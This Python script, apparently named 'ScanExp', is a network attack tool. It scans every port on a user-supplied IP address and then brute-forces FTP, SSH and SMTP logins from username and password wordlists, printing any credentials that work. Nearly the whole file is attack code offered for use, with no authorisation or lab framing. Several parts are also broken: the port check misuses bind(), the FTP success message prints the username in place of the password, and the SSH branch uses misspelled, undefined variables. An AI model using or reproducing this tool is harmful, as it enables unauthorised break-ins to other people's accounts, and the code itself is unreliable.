import socket
import smtplib
import paramiko
import time
import pyfiglet
from smtplib import SMTP
from ftplib import FTP

Ascii = pyfiglet.figlet_format("ScanExp")
print(Ascii)
print("\n")
print("[1] TCP Port Scan")
print("[2] UDP Port Scan")

maininput = input("->")

ip = input("Input an IP Address\n->")

print(ip)

openports = []

for port in range(65535):	 #check for all available ports

	try:
		if maininput == "1":
			serv = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # create a new socket
		elif maininput == "2":
			serv = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # create a new socket
		else:
			print("Please choose between TCP Scan and UDP Scan, input 1 and input 2 respectively")
			print("[1] TCP Port Scan")
			print("[2] UDP Port Scan")
			exit()

		serv.bind((ip,port)) # bind socket with address

	except:
		print(f"[OPEN] Open Port: {port}")
		openports.append(port)

	serv.close() #close connection

print(f"Looking to exploit {ip} open ports'")

with open("usernames.txt", "r") as usernamesopen:
	usernamesread = usernamesopen.read()            # Default usernames wordlist
	fileusernames = usernamesread.splitlines()

with open("passwords.txt", "r") as passwordsopen:
	passwordsread = passwordsopen.read()           # Default passwords wordlist
	filepasswords = passwordsread.splitlines()

def ftp_brute_force():
	print(f"Executing FTP Brute Force on {ip} Open Port 20/21")
	try:
		ftpusernamepreference = input("Do you want to use a default wordlist for usernames? (Y/N): ")
		if ftpusernamepreference == "Y":
			ftpusernamechoice = "default"
			print("Default usernames wordlist set.")
		elif ftpusernamepreference == "y":
			ftpusernamechoice = "default"
			print("Default usernames wordlist set.")
		elif ftpusernamepreference == "N":                  # FTP Usernames wordlist choice
			ftpusernamechoice = "personalized"
			ftppersonalizedusernamesinput = input("Input the path of the txt wordlist file for usernames\n-->")
			with open(ftppersonalizedusernamesinput, "r") as ftppersonalizedusernamesopen:
				ftppersonalizedusernamesread = ftppersonalizedusernamesopen.read()
				ftppersonalizedusernames = ftppersonalizedusernamesread.splitlines()
				print("Personalized usernames wordlist set.")
		elif ftpusernamepreference == "n":                  # FTP Usernames wordlist choice
			ftpusernamechoice = "personalized"
			ftppersonalizedusernamesinput = input("Input the path of the txt wordlist file for usernames\n-->")
			with open(ftppersonalizedusernamesinput, "r") as ftppersonalizedusernamesopen:
				ftppersonalizedusernamesread = ftppersonalizedusernamesopen.read()
				ftppersonalizedusernames = ftppersonalizedusernamesread.splitlines()
				print("Personalized usernames wordlist set.")
		else:
			print("No choice (Y/N), therefore continuing with default wordlst for usernames.")
			ftpusernamechoice = "default"
		ftppasswordpreference = input("Do you want to use a default wordlist for passwords? (Y/N): ")
		if ftppasswordpreference == "Y":
			ftppasswordchoice = "default"
			print("Default passwords wordlist set.")
		elif ftppasswordpreference == "y":
			ftppasswordchoice = "default"
			print("Default password wordlist set.")
		elif ftppasswordpreference == "N":                # FTP Passwords wordlist choice
			ftppasswordchoice = "personalized"
			ftppersonalizedpasswordsinput = input("Input the path of the txt wordlist file for passwords\n-->")
			with open(ftppersonalizedpasswordsinput, "r") as ftppersonalizedpasswordsopen:
				ftppersonalizedpasswordsread = ftppersonalizedpasswordsopen.read()
				ftppersonalizedpasswords = ftppersonalizedpasswordsread.splitlines()
				print("Personalized passwords wordlist set.")
		elif ftppasswordpreference == "n":                # FTP Passwords wordlist choice
			ftppasswordchoice = "personalized"
			ftppersonalizedpasswordsinput = input("Input the path of the txt wordlist file for passwords\n-->")
			with open(ftppersonalizedpasswordsinput, "r") as ftppersonalizedpasswordsopen:
				ftppersonalizedpasswordsread = ftppersonalizedpasswordsopen.read()
				ftppersonalizedpasswords = ftppersonalizedpasswordsread.splitlines()
				print("Personalized passwords wordlist set.")
		else:
			print("No (Y/N) choice, therefore continuing with default wordlist for passwords.")
			ftppasswordchoice = "default"
		if ftpusernamechoice == "default":
			ftpusernames = fileusernames
		elif ftpusernamechoice == "personalized":
			ftpusernames = ftppersonalizedusernames          # Credentials Selection
		if ftppasswordchoice == "default":
			ftppasswords = filepasswords
		elif ftppasswordchoice == "personalized":
			ftppasswords = ftppersonalizedpasswords

		for ftpusername in ftpusernames:
			for ftppassword in ftppasswords:
				try:
					ftp = FTP(ip)
					ftp.login(user=ftpusername, passwd=ftppassword)                        # Executing FTP Brute Force
					print(f"[VALID] Valid Credentials found:\nUsername: {ftpusername} | Password: {ftpusername}")
					break
				except Exception as e:
					print(f"[Invalid] Username: {ftpusername} | Password: {ftppassword}")
	except Exception as ftp_brute_force_error:
		print("Error during FTP Brute Force")
		print(ftp_brute_force_error)

def ssh_brute_force():
	print(f"Executing SSH Brute Force on {ip} Open Port 22")
	try:
		sshusernamepreference = input("Do you want to set a default wordlist for usernames? (Y/N): ")
		if sshusernamepreference == "Y":
			sshusernamechoice = "default"
			print("Default usernames wordlist set.")
		elif sshusernamepreference == "N":
			sshusernamechoice = "personalized"
			smtppersonalizedusernamesinput = input("Input the path of the wordlist txt file for usernames\n--->")
			with open(sshpersonalizedusernamesinput, "r") as sshpersonalizedusernamesopen:
				sshpersonalizedusernamesread = sshpersonalizedusernamesopen.read()
				sshpersonalizedusernames = sshpersonalizedusernamesread.splitlines()
		elif sshusernamepreference == "y":
			sshusernamechoice = "default"
			print("Default usernames wordlist set.")
		elif sshusernameprefernce == "N":
			sshusernamechoice = "personalized"
			smtppersonalizedusernamesinput = input("Input the path of the wordlist txt file for usernames\n--->")
			with open(sshpersonalizedusernamesinput, "r") as sshpersonalizedusernamesopen:
				sshpersonalizedusernamesread = sshpersonalizedusernamesopen.read()
				sshpersonalizedusernames = sshpersonalizedusernamesread.splitlines()
		else:
			sshusernamechoice = "default"
			print("No (Y/N) choice, therefore default usernames wordlist was set.")
		sshpasswordpreference = input("Do you want to use a default wordlist for passwords? (Y/N):  ")
		if sshpasswordpreference == "Y":
			sshpasswordchoice = "default"
			print("Default passwords wordlist set.")
		elif sshpasswordpreference == "N":
			sshpasswordchoice = "personalized"
			sshpersonalizedpasswordsinput = input("Input the path of the wordlist txt file for passwords\n--->")
			with open(sshpersonalizedspasswordinput, "r") as sshpersonalizedpasswordsopen:
				sshpersonalizedpasswordsread = sshpersonalizedpasswordsopen.read()
				sshpersonalizedpasswords = sshpersonalizedpasswordsread.splitlines()
		elif sshpasswordpreference == "Y":
			sshpasswordchoice = "default"
			print("Default passwords wordlist set.")
		elif sshpasswordpreference == "n":
			sshpasswordchoice = "personalized"
			sshpersonalizedpasswordsinput = input("Input the path of the wordlist txt file for passwords\n--->")
			with open(sshpersonalizedspasswordinput, "r") as sshpersonalizedpasswordsopen:
				sshpersonalizedpasswordsread = sshpersonalizedpasswordsopen.read()
				sshpersonalizedpasswords = sshpersonalizedpasswordsread.splitlines()
		else:
			sshpasswordchoice = "default"
			print("No (Y/N) choice, therefore default passwords wordlist set.")
		if sshusernamechoice == "default":
			sshusernames = fileusernames
		elif sshusernamechoice == "personalized":
			sshusernames = sshpersonalizedusernames
		if sshpasswordchoice == "default":
			sshpasswords = filepasswords
		elif sshpasswordchoice == "personalized":
			sshpasswords = sshpersonalizedpasswords

		def ssh_brute_force_execution():
			for sshusername in sshusernames:
				for sshpassword in sshpasswords:
					client = paramiko.SSHClient()
					client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						client.connect(hostname=ip, username=sshusername, password=sshpassword, timeout=3)
					except socket.timeout:
						print(F"SSH Host {ip} is unreachable, connection timed out")
						return False
					except paramiko.AuthenticationException:
						print(f"[Invalid] Username: {sshusername} | Password: {sshpassword}")
						return False
					except paramiko.SSHException:
						print(f"[Stop with Delay] Quota exceeded, retrying with 60 seconds delay...")
						time.sleep(60)
						return ssh_brute_force_execution()
					else:
						print(f"[VALID] Valid Credentials Found:\nUsername: {sshusername} | Password: {sshpassword}")
						return True

		ssh_brute_force_execution()
	except Exception as ssh_brute_force_error:
		print("Error during SSH Brute Force")
		print(ssh_brute_force_error)

def smtp_brute_force():
	print(f"Executing SMTP Brute Force on {ip} Open Port 25")
	try:
		smtpusernamepreference = input("Do you want to use a default wordlist for usernames? (Y/N): ")
		if smtpusernamepreference == "Y":
			smtpusernamechoice = "default"
			print("Default usernames wordlist set.")
		elif smtpusernamepreference == "N":
			smtpusernamechoice = "personalized"
			smtppersonalizedusernamesinput = input("Input the path of the wordlist txt file for usernames\n-->")
			with open(smtppersonalizedusernamesinput, "r") as smtppersonalizedusernamesopen:
				smtppersonalizedusernamesread = smtppersonalizedusernamesopen.read()
				smtppersonalizedusernames = smtppersonalizedusernamesread.splitlines()
		elif smtpusernamepreference == "y":
			smtpusernamechoice = "default"
			print("Default usernames wordlist set.")

		elif smtpusernamepreference == "N":
			smtpusernamechoice = "personalized"
			smtppersonalizedusernamesinput = input("Input the path of the wordlist txt file for usernames\n-->")
			with open(smtppersonalizedusernamesinput, "r") as smtppersonalizedusernamesopen:
				smtppersonalizedusernamesread = smtppersonalizedusernamesopen.read()
				smtppersonalizedusernames = smtppersonalizedusernamesread.splitlines()
		elif smtpusernamepreference == "n":
			smtpusernamechoice = "personalized"
			smtppersonalizedusernamesinput = input("Input the path of the wordlist txt file for usernames\n-->")
			with open(smtppersonalizedusernamesinput, "r") as smtppersonalizedusernamesopen:
				smtppersonalizedusernamesread = smtppersonalizedusernamesopen.read()
				smtppersonalizedusernames = smtppersonalizedusernamesread.splitlines()
		else:
			smtpusernamepreference = "default"
			print("No (Y/N) choice, therefore default usernames wordlist was set.")
		smtppasswordpreference = input("Do you want to use a default wordlist for passwords? (Y/N): ")
		if smtppasswordpreference == "Y":
			smtppasswordchoice = "default"
			print("Default wordlist for passwords set.")
		elif smtppasswordpreference == "N":
			smtppasswordchoice = "personalized"
			smtppersonalizedpasswordsinput = input("Input the path of the wordlist file for passwords\n-->")
			with open(smtppersonalizedpasswordsinput, "r") as smtppersonalizedpasswordsopen:
				smtppersonalizedpasswordsread = smtppersonalizedpasswordsopen.read()
				smtppersonalizedpasswords = smtppersonalizedpasswordsread.splitlines()
		if smtppasswordpreference == "y":
			smtppasswordchoice = "default"
			print("Default wordlist for passwords set.")
		elif smtppasswordpreference == "n":
			smtppasswordchoice = "personalized"
			smtppersonalizedpasswordsinput = input("Input the path of the wordlist file for passwords\n-->")
			with open(smtppersonalizedpasswordsinput, "r") as smtppersonalizedpasswordsopen:
				smtppersonalizedpasswordsread = smtppersonalizedpasswordsopen.read()
				smtppersonalizedpasswords = smtppersonalizedpasswordsread.splitlines()
		else:
			smtppasswordchoice = "default"
			print("No (Y/N) choice, therefore default wordlist for passwords was set.")
		if smtpusernamechoice == "default":
			smtpusernames = fileusernames
		elif smtpusernamechoice == "personalized":
			smtpusernames = smtppersonalizedusernames
		if smtppasswordchoice == "default":
			smtppasswords = filepasswords
		elif smtppasswordchoice == "personalized":
			smtppasswords = smtppersonalizedpasswords

		for smtpusername in smtpusernames:
			for smtppassword in smtppasswords:
				try:
					smtpbruteforce = smtplib.SMTP(ip, 25)
					smtpbruteforce.login(smtpusername, smtppassword)
					print(f"[VALID] Valid Credentials:\nUsername: {smtpusername} | Password: {smtppassword}")
					break
				except smtplib.SMTPAuthenticationError:
					print(f"[Invalid] Username: {smtpusername} | Password: {smtppassword}")
	except Exception as smtp_brute_force_error:
		print("Error during SMTP Brute Force")
		print(smtp_brute_force_error)

port_20 = ""
if 20 in openports:
	ftp_brute_force()
	port_20 = 1
else:
	port_20 = 0

if 21 in openports and port_20 == 0:
	ftp_brute_force()
elif 21 in openports and port_20 == 1:
	print("Already executed Brute Force on Open Port 20, therefore skipping Brute Force execution on Port 21.")

if 22 in openports:
	ssh_brute_force()

if 25 in openports:
	smtp_brute_force()

if 20 not in openports and 21 not in openports and 22 not in openports and 25 not in openports:
	print(f"No exploitable port found in {ip}")

print("\n")
print(Ascii)
print("\n")
